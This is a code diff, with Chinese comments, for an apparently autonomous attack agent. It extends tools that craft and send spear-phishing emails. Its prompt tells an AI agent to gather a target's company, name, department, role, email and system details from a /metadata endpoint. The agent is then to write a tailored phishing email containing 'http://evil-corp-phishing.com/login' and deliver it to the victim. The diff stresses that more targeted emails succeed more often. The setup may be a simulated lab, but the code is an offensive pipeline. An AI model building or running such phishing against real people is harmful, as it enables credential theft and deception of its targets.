@@ -57,34 +57,76 @@ async def fetch_url_content(url: str) -> str:
         return f"执行fetch_url_content工具时出错: {e}"
 
 @tool
-async def craft_phishing_email(target_name: str, company: str, malicious_link: str) -> str:
-    """根据侦察到的公司名称，为特定目标人物制作一封钓鱼邮件。"""
+async def craft_phishing_email(target_name: str, company: str, malicious_link: str, 
+                              department: str = None, role: str = None, email: str = None) -> str:
+    """
+    根据侦察到的公司名称和目标用户信息，制作一封高度定制化的钓鱼邮件。
+    
+    参数:
+    - target_name: 目标人物姓名
+    - company: 目标公司名称
+    - malicious_link: 恶意链接
+    - department: 目标部门（可选）
+    - role: 目标职位（可选）
+    - email: 目标邮箱（可选）
+    """
     try:
+        # 构建参数字典，仅包含非空参数
+        args = {
+            'target_name': target_name,
+            'company': company,
+            'malicious_link': malicious_link
+        }
+        
+        # 添加可选参数（如果提供）
+        if department:
+            args['department'] = department
+        if role:
+            args['role'] = role
+        if email:
+            args['email'] = email
+            
         async with attack_service_client.client as client:
             response = await client.call_tool(
                 "craft_phishing_email",
-                arguments={
-                    'target_name': target_name,
-                    'company': company,
-                    'malicious_link': malicious_link
-                }
+                arguments=args
             )
         return "\n".join([b.text for b in response.content if hasattr(b, "text")])
     except Exception as e:
         return f"执行craft_phishing_email工具时出错: {e}"
 
 @tool
-async def send_payload_to_victim(victim_url: str, company: str, malicious_link: str, email_body: str) -> str:
+async def send_payload_to_victim(victim_url: str, company: str, malicious_link: str, email_body: str, 
+                                target_name: str = None, department: str = None, role: str = None) -> str:
     """
     将最终制作好的钓鱼邮件载荷，通过API发送给受害者。
     这是攻击流程的最后一步。
+    
+    参数:
+    - victim_url: 受害者URL
+    - company: 目标公司名称
+    - malicious_link: 恶意链接
+    - email_body: 邮件正文内容
+    - target_name: 目标人物姓名（可选）
+    - department: 目标部门（可选）
+    - role: 目标职位（可选）
     """
     try:
+        # 构建基本载荷
         victim_payload = {
             "company": company,
             "malicious_link": malicious_link,
             "email_body": email_body
         }
+        
+        # 添加可选参数（如果提供）
+        if target_name:
+            victim_payload["target_name"] = target_name
+        if department:
+            victim_payload["department"] = department
+        if role:
+            victim_payload["role"] = role
+            
         async with httpx.AsyncClient() as client:
             # 确保URL是完整的
             if not victim_url.endswith('/receive_email'):
@@ -296,14 +338,31 @@ class AttackRequest(BaseModel):
 async def execute_full_attack(request: AttackRequest):
     """
     接收来自中央智能体的指令，启动一次完整的、自主的攻击。
+    现在会获取更多目标信息，生成更具针对性的钓鱼邮件。
     """
     # 构造一个清晰的指令，让Agent开始工作
     input_prompt = f"""
     开始对目标 {request.target_host} 执行一次完整的钓鱼攻击。
-    你的侦察起点是目标的 /metadata 端点。
-    获取到公司名后，为名为 '张三' 的目标人物制作钓鱼邮件。
-    恶意链接可以设定为 'http://evil-corp-phishing.com/login'。
+    
+    首先，你需要通过目标的 /metadata 端点进行侦察，获取尽可能多的信息，包括：
+    - 公司名称
+    - 用户名
+    - 部门
+    - 职位
+    - 邮箱
+    - 系统信息
+    - 内核版本
+    - 主机类型
+    
+    然后，利用这些信息为目标制作一封高度定制化的钓鱼邮件。邮件内容应该：
+    1. 针对目标的部门和职位定制
+    2. 引用目标可能使用的系统或软件
+    3. 使用与目标公司相关的术语
+    4. 包含恶意链接 'http://evil-corp-phishing.com/login'
+    
     最后，你必须调用 `send_payload_to_victim` 工具将邮件发送给目标，并报告最终结果。
+    
+    记住，越是针对性强的钓鱼邮件，成功率越高。利用所有可用的信息使攻击更加精准。
     """
     try:
         # 运行Agent，它现在会自主完成所有步骤，包括最后的交付
